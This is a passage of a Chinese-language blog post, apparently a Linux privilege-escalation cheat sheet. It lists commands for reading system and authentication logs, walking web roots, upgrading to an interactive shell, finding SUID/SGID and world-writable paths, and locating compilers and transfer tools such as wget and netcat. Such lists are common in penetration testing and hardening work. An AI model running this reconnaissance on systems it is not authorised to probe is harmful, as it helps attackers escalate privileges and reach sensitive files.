+ls&nbsp;-aRl&nbsp;/etc/&nbsp;|&nbsp;awk&nbsp;’;$1&nbsp;~&nbsp;/w.$/’&nbsp;2&gt;/dev/null&nbsp;#&nbsp;Other
+find&nbsp;/etc/&nbsp;-readable&nbsp;-type&nbsp;f&nbsp;2&gt;/dev/null&nbsp;#&nbsp;Anyone
+find&nbsp;/etc/&nbsp;-readable&nbsp;-type&nbsp;f&nbsp;-maxdepth&nbsp;1&nbsp;2&gt;/dev/null&nbsp;#&nbsp;Anyone</pre><h4 style="word-wrap: break-word; margin: 0.3em 0px 0px; padding: 0.5em 0px 0px; font-size: 14px; white-space: normal; background: none rgb(255, 255, 255); overflow: hidden; border-bottom: none; line-height: 1.6;"><span class="mw-headline" id=".E6.9F.A5.E6.89.BE_.2Fvar.2F_.E7.9B.AE.E5.BD.95.E7.9A.84.E9.9A.90.E8.97.8F.E5.8F.AF.E7.96.91.E6.96.87.E4.BB.B6" style="word-wrap: break-word;">查找 /var/ 目录的隐藏可疑文件</span></h4><pre style="word-wrap: break-word; font-size: 14px; font-family: monospace, Courier; background-color: rgb(249, 249, 249); border-left-width: 1px; border-left-color: rgb(221, 221, 221); padding: 1em; white-space: pre-wrap; line-height: 1.3em;">ls&nbsp;-alh&nbsp;/var/log
+ls&nbsp;-alh&nbsp;/var/mail
+ls&nbsp;-alh&nbsp;/var/spool
+ls&nbsp;-alh&nbsp;/var/spool/lpd
+ls&nbsp;-alh&nbsp;/var/lib/pgsql
+ls&nbsp;-alh&nbsp;/var/lib/mysql
+cat&nbsp;/var/lib/dhcp3/dhclient.leases</pre><h4 style="word-wrap: break-word; margin: 0.3em 0px 0px; padding: 0.5em 0px 0px; font-size: 14px; white-space: normal; background: none rgb(255, 255, 255); overflow: hidden; border-bottom: none; line-height: 1.6;"><span class="mw-headline" id=".E6.9F.A5.E6.89.BE.E7.BD.91.E7.AB.99.E7.9A.84.E9.9A.90.E8.97.8F.E9.85.8D.E7.BD.AE.E6.96.87.E4.BB.B6" style="word-wrap: break-word;">查找网站的隐藏配置文件</span></h4><pre style="word-wrap: break-word; font-size: 14px; font-family: monospace, Courier; background-color: rgb(249, 249, 249); border-left-width: 1px; border-left-color: rgb(221, 221, 221); padding: 1em; white-space: pre-wrap; line-height: 1.3em;">ls&nbsp;-alhR&nbsp;/var/www/
+ls&nbsp;-alhR&nbsp;/srv/www/htdocs/
+ls&nbsp;-alhR&nbsp;/usr/local/www/apache22/data/
+ls&nbsp;-alhR&nbsp;/opt/lampp/htdocs/
+ls&nbsp;-alhR&nbsp;/var/www/html/</pre><h4 style="word-wrap: break-word; margin: 0.3em 0px 0px; padding: 0.5em 0px 0px; font-size: 14px; white-space: normal; background: none rgb(255, 255, 255); overflow: hidden; border-bottom: none; line-height: 1.6;"><span class="mw-headline" id=".E6.9F.A5.E7.9C.8B.E7.9B.B8.E5.85.B3.E7.B3.BB.E7.BB.9F.E6.97.A5.E5.BF.97" style="word-wrap: break-word;">查看相关系统日志</span></h4><pre style="word-wrap: break-word; font-size: 14px; font-family: monospace, Courier; background-color: rgb(249, 249, 249); border-left-width: 1px; border-left-color: rgb(221, 221, 221); padding: 1em; white-space: pre-wrap; line-height: 1.3em;">#&nbsp;http://www.thegeekstuff.com/2011/08/linux-var-log-files/cat&nbsp;/etc/httpd/logs/access_log
+cat&nbsp;/etc/httpd/logs/access.log
+cat&nbsp;/etc/httpd/logs/error_log
+cat&nbsp;/etc/httpd/logs/error.log
+cat&nbsp;/var/log/apache2/access_log
+cat&nbsp;/var/log/apache2/access.log
+cat&nbsp;/var/log/apache2/error_log
+cat&nbsp;/var/log/apache2/error.log
+cat&nbsp;/var/log/apache/access_log
+cat&nbsp;/var/log/apache/access.log
+cat&nbsp;/var/log/auth.log
+cat&nbsp;/var/log/chttp.log
+cat&nbsp;/var/log/cups/error_log
+cat&nbsp;/var/log/dpkg.log
+cat&nbsp;/var/log/faillog
+cat&nbsp;/var/log/httpd/access_log
+cat&nbsp;/var/log/httpd/access.log
+cat&nbsp;/var/log/httpd/error_log
+cat&nbsp;/var/log/httpd/error.log
+cat&nbsp;/var/log/lastlog
+cat&nbsp;/var/log/lighttpd/access.log
+cat&nbsp;/var/log/lighttpd/error.log
+cat&nbsp;/var/log/lighttpd/lighttpd.access.log
+cat&nbsp;/var/log/lighttpd/lighttpd.error.log
+cat&nbsp;/var/log/messages
+cat&nbsp;/var/log/secure
+cat&nbsp;/var/log/syslog
+cat&nbsp;/var/log/wtmp
+cat&nbsp;/var/log/xferlog
+cat&nbsp;/var/log/yum.log
+cat&nbsp;/var/run/utmp
+cat&nbsp;/var/webmin/miniserv.log
+cat&nbsp;/var/www/logs/access_log
+cat&nbsp;/var/www/logs/access.log
+ls&nbsp;-alh&nbsp;/var/lib/dhcp3/
+ls&nbsp;-alh&nbsp;/var/log/postgresql/
+ls&nbsp;-alh&nbsp;/var/log/proftpd/
+ls&nbsp;-alh&nbsp;/var/log/samba/
+auth.log,&nbsp;boot,&nbsp;btmp,&nbsp;daemon.log,&nbsp;debug,&nbsp;dmesg,&nbsp;kern.log,&nbsp;mail.info,
+mail.log,&nbsp;mail.warn,&nbsp;messages,&nbsp;syslog,&nbsp;udev,&nbsp;wtmp(有什么文件？log.系统引导……)</pre><h4 style="word-wrap: break-word; margin: 0.3em 0px 0px; padding: 0.5em 0px 0px; font-size: 14px; white-space: normal; background: none rgb(255, 255, 255); overflow: hidden; border-bottom: none; line-height: 1.6;"><span class="mw-headline" id=".E4.B8.80.E5.8F.A5.E8.AF.9D.E5.88.9B.E5.BB.BA.E5.8F.AF.E4.BA.A4.E4.BA.92.E5.BC.8F.E5.8F.8D.E5.BC.B9_Shell" style="word-wrap: break-word;">一句话创建可交互式反弹 Shell</span></h4><pre style="word-wrap: break-word; font-size: 14px; font-family: monospace, Courier; background-color: rgb(249, 249, 249); border-left-width: 1px; border-left-color: rgb(221, 221, 221); padding: 1em; white-space: pre-wrap; line-height: 1.3em;">python&nbsp;-c&nbsp;‘import&nbsp;pty;pty.spawn(“/bin/bash”)’
+echo&nbsp;os.system(‘/bin/bash’)
+/bin/sh&nbsp;-i</pre><h4 style="word-wrap: break-word; margin: 0.3em 0px 0px; padding: 0.5em 0px 0px; font-size: 14px; white-space: normal; background: none rgb(255, 255, 255); overflow: hidden; border-bottom: none; line-height: 1.6;"><span class="mw-headline" id=".E6.8C.82.E8.BD.BD.E6.96.87.E4.BB.B6.E7.B3.BB.E7.BB.9F" style="word-wrap: break-word;">挂载文件系统</span></h4><pre style="word-wrap: break-word; font-size: 14px; font-family: monospace, Courier; background-color: rgb(249, 249, 249); border-left-width: 1px; border-left-color: rgb(221, 221, 221); padding: 1em; white-space: pre-wrap; line-height: 1.3em;">mount
+df&nbsp;-h</pre><h4 style="word-wrap: break-word; margin: 0.3em 0px 0px; padding: 0.5em 0px 0px; font-size: 14px; white-space: normal; background: none rgb(255, 255, 255); overflow: hidden; border-bottom: none; line-height: 1.6;"><span class="mw-headline" id=".E6.9F.A5.E7.9C.8B.E7.B3.BB.E7.BB.9F.E6.8C.82.E8.BD.BD.E6.83.85.E5.86.B5" style="word-wrap: break-word;">查看系统挂载情况</span></h4><pre style="word-wrap: break-word; font-size: 14px; font-family: monospace, Courier; background-color: rgb(249, 249, 249); border-left-width: 1px; border-left-color: rgb(221, 221, 221); padding: 1em; white-space: pre-wrap; line-height: 1.3em;">cat&nbsp;/etc/fstab</pre><h4 style="word-wrap: break-word; margin: 0.3em 0px 0px; padding: 0.5em 0px 0px; font-size: 14px; white-space: normal; background: none rgb(255, 255, 255); overflow: hidden; border-bottom: none; line-height: 1.6;"><span class="mw-headline" id=".E9.AB.98.E7.BA.A7_Linux_.E6.96.87.E4.BB.B6.E6.9D.83.E9.99.90.E4.BD.BF.E7.94.A8.EF.BC.88Sticky_bits.2C_SUID_.E5.92.8C_GUID.EF.BC.89" style="word-wrap: break-word;">高级 Linux 文件权限使用（Sticky bits, SUID 和 GUID）</span></h4><pre style="word-wrap: break-word; font-size: 14px; font-family: monospace, Courier; background-color: rgb(249, 249, 249); border-left-width: 1px; border-left-color: rgb(221, 221, 221); padding: 1em; white-space: pre-wrap; line-height: 1.3em;">find&nbsp;/&nbsp;-perm&nbsp;-1000&nbsp;-type&nbsp;d&nbsp;2&gt;/dev/null&nbsp;#&nbsp;Sticky&nbsp;bit&nbsp;–&nbsp;Only&nbsp;the&nbsp;owner&nbsp;of&nbsp;the&nbsp;directory&nbsp;or&nbsp;the&nbsp;owner&nbsp;of&nbsp;a&nbsp;file&nbsp;can&nbsp;delete&nbsp;or&nbsp;rename&nbsp;here
+find&nbsp;/&nbsp;-perm&nbsp;-g=s&nbsp;-type&nbsp;f&nbsp;2&gt;/dev/null&nbsp;#&nbsp;SGID&nbsp;(chmod&nbsp;2000)&nbsp;–&nbsp;run&nbsp;as&nbsp;the&nbsp;group,&nbsp;not&nbsp;the&nbsp;user&nbsp;who&nbsp;started&nbsp;it.
+find&nbsp;/&nbsp;-perm&nbsp;-u=s&nbsp;-type&nbsp;f&nbsp;2&gt;/dev/null&nbsp;#&nbsp;SUID&nbsp;(chmod&nbsp;4000)&nbsp;–&nbsp;run&nbsp;as&nbsp;the&nbsp;owner,&nbsp;not&nbsp;the&nbsp;user&nbsp;who&nbsp;started&nbsp;it.
+find&nbsp;/&nbsp;-perm&nbsp;-g=s&nbsp;-o&nbsp;-perm&nbsp;-u=s&nbsp;-type&nbsp;f&nbsp;2&gt;/dev/null&nbsp;#&nbsp;SGID&nbsp;or&nbsp;SUID
+for&nbsp;i&nbsp;in&nbsp;<code>locate&amp;nbsp;-r&amp;nbsp;“bin$”</code>;&nbsp;do&nbsp;find&nbsp;$i&nbsp;(&nbsp;-perm&nbsp;-4000&nbsp;-o&nbsp;-perm&nbsp;-2000&nbsp;)&nbsp;-type&nbsp;f&nbsp;2&gt;/dev/null;&nbsp;done&nbsp;#Looks&nbsp;in&nbsp;&#39;common&#39;&nbsp;places:&nbsp;/bin,&nbsp;/sbin,&nbsp;/usr/bin,&nbsp;/usr/sbin,/usr/local/bin,&nbsp;/usr/local/sbin&nbsp;and&nbsp;any&nbsp;other&nbsp;<em>bin,&nbsp;for&nbsp;SGID&nbsp;or&nbsp;SUID(Quicker&nbsp;search)#
+findstarting&nbsp;at&nbsp;root&nbsp;(/),&nbsp;SGIDorSUID,&nbsp;not&nbsp;Symbolic&nbsp;links,&nbsp;only&nbsp;3
+folders&nbsp;deep,&nbsp;list&nbsp;with&nbsp;more&nbsp;detail&nbsp;and&nbsp;hideany&nbsp;errors&nbsp;(e.g.&nbsp;permissiondenied)
+find/-perm&nbsp;-g=s-o-perm&nbsp;-4000!&nbsp;-type&nbsp;l-maxdepth&nbsp;3&nbsp;-exec&nbsp;ls&nbsp;-ld&nbsp;{}&nbsp;;2&gt;/dev/null</pre><h4 style="word-wrap: break-word; margin: 0.3em 0px 0px; padding: 0.5em 0px 0px; font-size: 14px; white-space: normal; background: none rgb(255, 255, 255); overflow: hidden; border-bottom: none; line-height: 1.6;"><span class="mw-headline" id=".E5.93.AA.E4.BA.9B.E7.9B.AE.E5.BD.95.E5.85.B7.E6.9C.89.E5.86.99.E5.85.A5.E6.9D.83.E9.99.90.EF.BC.88.E5.87.A0.E4.B8.AA.E9.80.9A.E7.94.A8.E7.9A.84.E7.9B.AE.E5.BD.95.EF.BC.9A.2Ftmp.EF.BC.8C.2Fvar.EF.BC.8C.2Ftmp.EF.BC.8C.2Fdev.EF.BC.8C.2Fshm.EF.BC.89" style="word-wrap: break-word;">哪些目录具有写入权限（几个通用的目录：/tmp，/var，/tmp，/dev，/shm）</span></h4><pre style="word-wrap: break-word; font-size: 14px; font-family: monospace, Courier; background-color: rgb(249, 249, 249); border-left-width: 1px; border-left-color: rgb(221, 221, 221); padding: 1em; white-space: pre-wrap; line-height: 1.3em;">find&nbsp;/&nbsp;-writable&nbsp;-type&nbsp;d&nbsp;2&gt;/dev/null&nbsp;#&nbsp;world-writeable&nbsp;folders
+find&nbsp;/&nbsp;-perm&nbsp;-222&nbsp;-type&nbsp;d&nbsp;2&gt;/dev/null&nbsp;#&nbsp;world-writeable&nbsp;folders
+find&nbsp;/&nbsp;-perm&nbsp;-o+w&nbsp;-type&nbsp;d&nbsp;2&gt;/dev/null&nbsp;#&nbsp;world-writeable&nbsp;folders
+find&nbsp;/&nbsp;-perm&nbsp;-o+x&nbsp;-type&nbsp;d&nbsp;2&gt;/dev/null&nbsp;#&nbsp;world-executable&nbsp;folders
+find&nbsp;/&nbsp;(&nbsp;-perm&nbsp;-o+w&nbsp;-perm&nbsp;-o+x&nbsp;)&nbsp;-type&nbsp;d&nbsp;2&gt;/dev/null&nbsp;#&nbsp;world-writeable&nbsp;&amp;&nbsp;executable&nbsp;foldersAny&nbsp;“problem”&nbsp;files？可写的的，“没有使用”的文件
+find&nbsp;/&nbsp;-xdev&nbsp;-type&nbsp;d&nbsp;(&nbsp;-perm&nbsp;-0002&nbsp;-a&nbsp;!&nbsp;-perm&nbsp;-1000&nbsp;)&nbsp;-print&nbsp;#&nbsp;world-writeable&nbsp;files
+find&nbsp;/dir&nbsp;-xdev&nbsp;(&nbsp;-nouser&nbsp;-o&nbsp;-nogroup&nbsp;)&nbsp;-print&nbsp;#&nbsp;Noowner&nbsp;files</pre>###<span class="mw-headline" id=".E5.87.86.E5.A4.87.E5.92.8C.E6.9F.A5.E6.89.BE.E6.BC.8F.E6.B4.9E.E5.88.A9.E7.94.A8.E4.BB.A3.E7.A0.81" style="word-wrap: break-word;">准备和查找漏洞利用代码</span><h4 style="word-wrap: break-word; margin: 0.3em 0px 0px; padding: 0.5em 0px 0px; font-size: 14px; white-space: normal; background: none rgb(255, 255, 255); overflow: hidden; border-bottom: none; line-height: 1.6;"><span class="mw-headline" id=".E6.9F.A5.E7.9C.8B.E8.AF.AD.E8.A8.80.2F.E4.BB.A3.E7.A0.81.E6.94.AF.E6.8C.81.E6.83.85.E5.86.B5" style="word-wrap: break-word;">查看语言/代码支持情况</span></h4><pre style="word-wrap: break-word; font-size: 14px; font-family: monospace, Courier; background-color: rgb(249, 249, 249); border-left-width: 1px; border-left-color: rgb(221, 221, 221); padding: 1em; white-space: pre-wrap; line-height: 1.3em;">find&nbsp;/&nbsp;-name&nbsp;perl</em>
+find&nbsp;/&nbsp;-name&nbsp;python<em>
+find&nbsp;/&nbsp;-name&nbsp;gcc</em>
+find&nbsp;/&nbsp;-name&nbsp;cc</pre><h4 style="word-wrap: break-word; margin: 0.3em 0px 0px; padding: 0.5em 0px 0px; font-size: 14px; white-space: normal; background: none rgb(255, 255, 255); overflow: hidden; border-bottom: none; line-height: 1.6;"><span class="mw-headline" id=".E6.9F.A5.E6.89.BE.E5.8F.AF.E5.88.A9.E7.94.A8.E4.BA.8E.E4.BC.A0.E8.BE.93.E6.96.87.E4.BB.B6.E7.9A.84.E5.91.BD.E4.BB.A4" style="word-wrap: break-word;">查找可利用于传输文件的命令</span></h4><pre style="word-wrap: break-word; font-size: 14px; font-family: monospace, Courier; background-color: rgb(249, 249, 249); border-left-width: 1px; border-left-color: rgb(221, 221, 221); padding: 1em; white-space: pre-wrap; line-height: 1.3em;">find&nbsp;/&nbsp;-name&nbsp;wget
+find&nbsp;/&nbsp;-name&nbsp;nc<em>
+find&nbsp;/&nbsp;-name&nbsp;netcat</em>
+find&nbsp;/&nbsp;-name&nbsp;tftp*
+find&nbsp;/&nbsp;-name&nbsp;ftp
+find&nbsp;/&nbsp;-name&nbsp;scp</pre><p>    </p>
+            </div><!-- /.entry-content -->
+
+
+        </div><!-- /.eleven.columns -->
+
+<div class="three columns">
+<h4>站内搜索</h4>
+              <div class="navbar-search pull-right">
+                <script type="text/javascript">(function(){document.write(unescape('%3Cdiv id="bdcs"%3E%3C/div%3E'));var bdcs = document.createElement('script');bdcs.type = 'text/javascript';bdcs.async = true;bdcs.src = 'http://znsv.baidu.com/customer_search/api/js?sid=8305292233022102519' + '&plate_url=' + encodeURIComponent(window.location.href) + '&t=' + Math.ceil(new Date()/3600000);var s = document.getElementsByTagName('script')[0];s.parentNode.insertBefore(bdcs, s);})();</script>
+              </div>    
+
+<h4>页面</h4>
+
+ <ul>
+  </ul>
+
+<h4>分类</h4>
+<ul class="blank">
+		<li><a href="/blog/category/android.html">android</a></li>
+		<li><a href="/blog/category/api.html">api</a></li>
+		<li><a href="/blog/category/git.html">git</a></li>
+		<li><a href="/blog/category/go.html">go</a></li>
+		<li><a href="/blog/category/hack.html">hack</a></li>
+		<li><a href="/blog/category/ios.html">ios</a></li>
+		<li><a href="/blog/category/java.html">java</a></li>
+		<li><a href="/blog/category/javascript.html">javascript</a></li>
+		<li><a href="/blog/category/linux.html">linux</a></li>
+		<li><a href="/blog/category/mysql.html">mysql</a></li>
+		<li><a href="/blog/category/operation.html">operation</a></li>
+		<li><a href="/blog/category/others.html">others</a></li>
+		<li><a href="/blog/category/php.html">php</a></li>
+		<li><a href="/blog/category/program.html">program</a></li>
+		<li><a href="/blog/category/python.html">python</a></li>
+		<li><a href="/blog/category/read.html">read</a></li>
+		<li><a href="/blog/category/soft.html">soft</a></li>
+		<li><a href="/blog/category/success.html">success</a></li>
+		<li><a href="/blog/category/test.html">test</a></li>
+		<li><a href="/blog/category/vcs.html">vcs</a></li>
+		<li><a href="/blog/category/windows.html">windows</a></li>
+</ul>
+
+
+<h4>标签</h4>
+
+
+<nav class="widget">
+  <h4>友情链接</h4>
+  <ul class="blank">
+    <li><a href="/">搜索</a></li>
+    <li><a href="/123">导航</a></li>
+    <li><a href="/doc">文档</a></li>
+    <li><a href="/blog">博客</a></li>
+  </ul>
+</nav>
+
+</div> </div><!-- /.row -->
+
+
+</section>
+
+       </div><!-- /.row -->
+    </div><!-- /.container -->
+
+
+       <div class="container.nopad bg">
+
+    
+        <footer id="credits" class="row">
+          <div class="seven columns left-center">
+
+                   <address id="about" class="vcard body">
+                    Proudly powered by <a href="http://getpelican.com/">Pelican</a>,
+                    which takes great advantage of <a href="http://python.org">Python</a>.
+                    <br />
+                    Based on the <a target="_blank" href="http://gumbyframework.com">Gumby Framework</a>
+                    </address>
+          </div>
+
+
+          <div class="seven columns">
+            <div class="row">
+              <ul class="socbtns">
+
+
+
+
+
+              </ul>
+            </div>
+          </div>
+        </footer>
+
+    </div>
+
+
+  <script src="/blog/theme/js/libs/jquery-1.9.1.min.js"></script>
+  <script src="/blog/theme/js/libs/gumby.min.js"></script>
+  <script src="/blog/theme/js/plugins.js"></script>
+</body>
+</html>
